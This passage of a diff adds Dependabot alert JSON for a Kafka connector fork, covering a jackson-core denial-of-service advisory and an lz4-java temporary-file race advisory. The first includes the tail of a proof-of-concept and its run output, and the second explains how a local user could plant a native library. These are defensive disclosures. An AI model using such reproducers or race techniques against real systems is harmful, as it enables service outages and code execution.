null ? -1 : message.length();\n            System.out.println(\"Exception message length: \" + msgLen + \" characters\");\n            System.out.println(\"Elapsed time: \" + elapsedMs + \" ms\");\n            System.out.println(\"Message length bounded near default maxErrorTokenLength (256)? \" + (msgLen < 500));\n        }\n    }\n\n    static InputStream concat3(byte[] prefix, InputStream middle, byte[] suffix) {\n        InputStream first = new java.io.SequenceInputStream(new java.io.ByteArrayInputStream(prefix), middle);\n        return new java.io.SequenceInputStream(first, new java.io.ByteArrayInputStream(suffix));\n    }\n\n    static long usedHeap() {\n        Runtime rt = Runtime.getRuntime();\n        System.gc();\n        return rt.totalMemory() - rt.freeMemory();\n    }\n}\n```\n\n## Captured Evidence (actual run output)\n\n```\nMalformed token: \"t\" followed by 20000000 Java-identifier characters ('x'), then a terminating\nspace, never completing \"true\"/\"false\"/\"null\"/NaN.\n\n=== (a) UTF8DataInputJsonParser via createParser(DataInput) ===\nException message length: 20000109 characters\nElapsed time: 81 ms\nApprox additional heap used (best-effort, GC-noisy): 38 MB\nMessage length is proportional to the full 20000000-character attacker payload (unbounded)? true\n\n=== (b) UTF8StreamJsonParser via createParser(InputStream), SAME malformed input ===\nException message length: 367 characters\nElapsed time: 7 ms\nMessage length bounded near ErrorReportConfiguration.getMaxErrorTokenLength() (default 256)? true\n```\n\nThe same 20-million-character malformed token, fed to the two parser variants, produces a\n367-character message via the correctly-bounded `InputStream` path and a 20,000,109-character\nmessage via the vulnerable `DataInput` path \u2014 a difference of roughly 54,500x for identical\ninput, confirming the missing bound is the sole cause of the difference.\n\n## Impact\n\nAny application creating parsers via `JsonFactory.createParser(DataInput)` over\nattacker-supplied input (a fully public, documented API) is exposed to unbounded memory growth\nfrom a single malformed token. Scaling the payload from the 20MB demonstrated here to\ngigabytes (well within a typical unbounded request body) would drive the accumulated\n`StringBuilder` \u2014 which additionally undergoes byte-to-char expansion and internal doubling \u2014\nto consume many times the raw payload size, realistically triggering `OutOfMemoryError` and\ndenying service to the whole JVM process. Critically, **no available configuration mitigates\nthis**: `maxDocumentLength` cannot be set for `DataInput` sources at all, and `maxStringLength`\ndoes not apply to this code path.\n\n## Remediation\n\n1. Add the `maxErrorTokenLength` check to the append loop in\n   `UTF8DataInputJsonParser._reportInvalidToken()`, appending `\"...\"` and breaking when the\n   limit is reached \u2014 mirroring the three other parser implementations exactly.\n2. Add a parameterized regression test across all four parser implementations asserting the\n   exception message length is bounded by `maxErrorTokenLength` plus a small constant.\n3. Consider extracting this bounded-scan logic into a single shared helper on\n   `ParserMinimalBase` to prevent this class of per-implementation drift recurring.",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.fasterxml.jackson.core:jackson-core"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 2.19.0, <= 2.21.6",
+          "first_patched_version": {
+            "identifier": "2.21.7"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.fasterxml.jackson.core:jackson-core"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 2.22.0, <= 2.22.2",
+          "first_patched_version": {
+            "identifier": "2.22.3"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "tools.jackson.core:jackson-core"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 3.0.0, <= 3.1.6",
+          "first_patched_version": {
+            "identifier": "3.1.7"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "tools.jackson.core:jackson-core"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 3.2.0, <= 3.2.2",
+          "first_patched_version": {
+            "identifier": "3.2.3"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.fasterxml.jackson.core:jackson-core"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 2.8.0, <= 2.18.10",
+          "first_patched_version": {
+            "identifier": "2.18.11"
+          }
+        }
+      ],
+      "severity": "high",
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00492,
+        "percentile": 0.40585
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption"
+        },
+        {
+          "cwe_id": "CWE-770",
+          "name": "Allocation of Resources Without Limits or Throttling"
+        }
+      ],
+      "identifiers": [
+        {
+          "value": "GHSA-7hhh-6rmp-j9qf",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-89425",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/FasterXML/jackson-core/security/advisories/GHSA-7hhh-6rmp-j9qf"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-89425"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-core/pull/1698"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-core/commit/211cf2c5d91abbec38067f37efc1363cd4e88ee3"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-core/releases/tag/jackson-core-2.18.11"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-core/releases/tag/jackson-core-3.2.3"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-7hhh-6rmp-j9qf"
+        }
+      ],
+      "published_at": "2026-10-01T15:20:27Z",
+      "updated_at": "2026-10-01T15:20:28Z",
+      "withdrawn_at": null
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "com.fasterxml.jackson.core:jackson-core"
+      },
+      "severity": "high",
+      "vulnerable_version_range": ">= 2.8.0, <= 2.18.10",
+      "first_patched_version": {
+        "identifier": "2.18.11"
+      }
+    },
+    "url": "https://api.github.com/repos/dhasani23/dynamodb-kafka-konnect-fork/dependabot/alerts/11",
+    "html_url": "https://github.com/dhasani23/dynamodb-kafka-konnect-fork/security/dependabot/11",
+    "created_at": "2026-10-01T15:37:27Z",
+    "updated_at": "2026-10-01T15:37:27Z",
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 12,
+    "state": "dismissed",
+    "dependency": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "org.lz4:lz4-java"
+      },
+      "manifest_path": "build.gradle.kts",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-mcr4-qmvw-px4g",
+      "cve_id": "CVE-2026-106451",
+      "summary": "yawkat LZ4 Java: Native library extraction to a shared temporary directory is vulnerable to file replacement by another local user",
+      "description": "### Summary\n\nWhen no system-installed `liblz4-java` is found, `net.jpountz.util.Native.load()` extracts the bundled native library to `java.io.tmpdir` and loads it with `System.load`. The path of the extracted library can be predicted before it is created, and the library file is opened without exclusive creation. Another local user who can write to the same temporary directory can therefore create the file first and control the code that is loaded.\n\n### Details\n\n```java\ntempLibLock = File.createTempFile(\"liblz4-java-\", \".\" + os().libExtension + \".lck\");\ntempLib = new File(tempLibLock.getAbsolutePath().replaceFirst(\".lck$\", \"\"));\n// copy to tempLib\ntry (FileOutputStream out = new FileOutputStream(tempLib)) { ... }\n...\nSystem.load(tempLib.getAbsolutePath());\n```\n\nOnly the `.lck` file is created safely, with a random name and exclusive creation. The library path is the `.lck` name without the `.lck` suffix, and nothing reserves it. `new FileOutputStream(tempLib)` opens it with `O_CREAT|O_TRUNC` and follows symlinks.\n\nIn a shared, world-writable temporary directory, another user can watch for the `.lck` file and create the corresponding library file before it is opened. If they win that race, they own the file. The victim then writes into the attacker-owned file, and the attacker can overwrite it again before `System.load`.\n\nWhether this can be exploited depends on the host:\n\n- With `fs.protected_regular = 0`, the attacker can pre-create a world-writable file, and their code is then loaded into the victim's JVM.\n- With `fs.protected_regular >= 1` (the default on many systemd-based distributions), the victim's open fails. The library then fails to load and the library falls back to the Java implementations, so the attacker can only cause a denial of service.\n- A symlink variant is blocked by `fs.protected_symlinks = 1`.\n- Temporary directories without the sticky bit, or shared across users in containers, are exploitable whatever these settings are.\n\nThis behaviour was introduced upstream in commit c3ddae5 (lz4-java 1.7.0), which swapped which of the two files is created with `createTempFile`.\n\n### Impact\n\nA local user who can write to the same temporary directory as a victim process that uses the bundled JNI library may be able to execute code as the victim. Exploitation requires a shared temporary directory, host settings that permit it, and winning a race.\n\nThe issue does not apply if `liblz4-java` is found on `java.library.path`, if `java.io.tmpdir` is private to the user (for example systemd `PrivateTmp`, or a per-user temporary directory), or if only the Java implementations are used.\n\n### Patch\n\nFixed in lz4-java 1.11.4. The native library is now extracted directly into a file created by `File.createTempFile`, which has a random name and is created exclusively, so a file or symlink planted in advance cannot be reused. The `.lck` lock files are no longer used. Instead, the startup cleanup removes stale `liblz4-java-*` temporary files (including `.lck` files left by older versions) only once they are more than one hour old.\n\nFor older versions, the workaround is to set `java.io.tmpdir` to a directory writable only by the application user, or install `liblz4-java` on `java.library.path`.",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "at.yawk.lz4:lz4-java"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "<= 1.11.3",
+          "first_patched_version": {
+            "identifier": "1.11.4"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "org.lz4:lz4-java"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 1.7.0, <= 1.8.1",
+          "first_patched_version": null
+        }
+      ],
+      "severity": "high",
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": 0.0
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:L/AC:H/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+          "score": 7.3
+        }
+      },
+      "epss": {
+        "percentage": 0.00083,
+        "percentile": 0.00215
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-367",
+          "name": "Time-of-check Time-of-use (TOCTOU) Race Condition"
+        },
+        {
+          "cwe_id": "CWE-377",
+          "name": "Insecure Temporary File"
+        }
+      ],
+      "identifiers": [
+        {
+          "value": "GHSA-mcr4-qmvw-px4g",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-106451",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/yawkat/lz4-java/security/advisories/GHSA-mcr4-qmvw-px4g"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-106451"
+        },
+        {
+          "url": "https://github.com/yawkat/lz4-java/commit/7a48b7f6b8099b9dab6541e4ac2ee0979dc55aa3"
+        },
+        {
+          "url": "https://github.com/yawkat/lz4-java/releases/tag/v1.11.4"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-mcr4-qmvw-px4g"
+        }
+      ],
+      "published_at": "2026-10-07T20:35:51Z",
+      "updated_at": "2026-10-07T20:35:52Z",
+      "withdrawn_at": null
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "org.lz4:lz4-java"
+      },
+      "severity": "high",
+      "vulnerable_version_range": ">= 1.7.0, <= 1.8.1",
+      "first_patched_version": null
+    },
+    "url": "https://api.github.com/repos/dhasani23/dynamodb-kafka-konnect-fork/dependabot/alerts/12",
+    "html_url": "https://github.com/dhasani23/dynamodb-kafka-konnect-fork/security/dependabot/12",
+    "created_at": "2026-10-07T21:19:51Z",
+    "updated_at": "2026-10-09T16:12:04Z",
+    "dismissed_at": "2026-10-09T16:12:04Z",
+    "dismissed_by": {
+      "login": "dhasani23",
+      "id": 60020664,
+      "node_id": "MDQ6VXNlcjYwMDIwNjY0",
+      "avatar_url": "https://avatars.githubusercontent.com/u/60020664?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/dhasani23",
+      "html_url": "https://github.com/dhasani23",
+      "type": "User",
+      "site_admin": false
+    },
+    "dismissed_reason": "tolerable_risk",
+    "dismissed_comment": "Connect workers run with PrivateTmp=true, so the native library is extracted to a per-service tmp directory that other users cannot write to. Revisit when lz4-java is replaced.",
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  }
+]
